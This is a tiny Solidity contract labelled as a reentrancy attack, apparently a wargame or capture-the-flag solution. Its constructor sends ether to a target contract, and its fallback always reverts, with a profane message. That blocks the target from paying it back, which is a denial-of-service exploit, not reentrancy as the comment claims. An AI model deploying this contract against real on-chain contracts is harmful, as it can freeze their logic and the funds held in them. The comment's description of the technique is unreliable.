// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Reentrancy attack.

contract Attack {

    constructor(address _target) payable {
        address(_target).call{value:msg.value}("");
    }

    fallback() external payable { revert ("Bitch"); }

}
